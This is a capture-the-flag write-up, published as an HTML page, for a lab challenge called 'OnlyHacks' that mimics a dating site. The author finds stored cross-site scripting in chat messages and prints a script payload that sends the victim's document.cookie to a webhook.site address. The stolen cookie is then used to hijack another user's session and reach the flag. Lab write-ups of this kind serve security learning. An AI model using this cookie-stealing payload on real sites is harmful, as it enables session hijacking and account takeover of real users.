@@ -1,0 +1,112 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2025-05-05 Mon 21:34 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>OnlyHacks</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content" class="content">
+<h1 class="title">OnlyHacks</h1>
+<p>
+This is a website that asks for login credentials right away. Since I don't have
+an account, I guess I have to register by clicking on the <code>Sign Up Now</code> button.
+</p>
+
+
+
+<div id="org0b4257d" class="figure">
+<p><img src="writeup-img/2025-02-15_15-41-03_screenshot.png" alt="2025-02-15_15-41-03_screenshot.png" />
+</p>
+</div>
+
+<p>
+Be warned that you have to actually fill all the fields, including uploading an
+image. If you don't, a non-sensical error will occur and you will have to write
+it all over again. In my case, I just put random data, except my username. After
+registering, you will be presented with an interface that shows you a person and
+you have to click on the cross or the heart. I assume the cross is to ignore,
+and the heart is to match with the person. I clicked on the heart for everyone,
+regardless. After that, I went to the <code>Matches</code> and I was presented with a message
+from Renata. I did spend some time talking to "her", because I was testing if it
+was some kind of AI or just some script sending messages from a set number of
+messages. It seems it was an AI, because it did react to thing I said, although
+it was a bit repetitive, always asking for donations&#x2026; makes sense though!
+</p>
+
+
+
+<div id="org5cc5ed3" class="figure">
+<p><img src="writeup-img/2025-02-15_15-48-56_screenshot.png" alt="2025-02-15_15-48-56_screenshot.png" />
+</p>
+</div>
+
+<p>
+This being a user input&#x2026; can I send HTML? Let's try something like <code>This is
+&lt;b&gt;bold&lt;/b&gt; and this is &lt;i&gt;italic&lt;/i&gt;.</code>:
+</p>
+
+
+
+<div id="org74eb3b5" class="figure">
+<p><img src="writeup-img/2025-02-15_15-57-57_screenshot.png" alt="2025-02-15_15-57-57_screenshot.png" />
+</p>
+</div>
+
+<p>
+So it's seems I can inject HTML. I tried something like
+<code>&lt;script&gt;alert(1);&lt;/script&gt;</code> and it also works! Since users do have a session
+cookie, I guess this could be an opportunity to hijack Renata's session. To do
+this, I will use <a href="http://webhook.site/">http://webhook.site/</a> to inject <code>Javascript</code> to get the cookie, like this:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span class="org-function-name">script</span> type=&#8220;text/javascript&#8221;&gt;
+  <span class="org-variable-name">document.location</span>="https://webhook.site/4e02f6ce-2e64-4ab5-86a0-b529ded6e6db/?c="+document.cookie;
+&lt;/<span class="org-function-name">script</span>&gt;
+</pre>
+</div>
+
+<p>
+And it was successful! After that, I just copied the session cookie, replaced it
+using the browser developer tools and refreshed the page. You can see that now I
+am in Renata's session, talking to myself.
+</p>
+
+
+
+<div id="orgd57756d" class="figure">
+<p><img src="writeup-img/2025-02-15_16-21-31_screenshot.png" alt="2025-02-15_16-21-31_screenshot.png" />
+</p>
+</div>
+
+<p>
+Also, the flag is in another conversation with other user! :-)
+</p>
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">15-02-2025</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+</div>
+</body>
+</html>
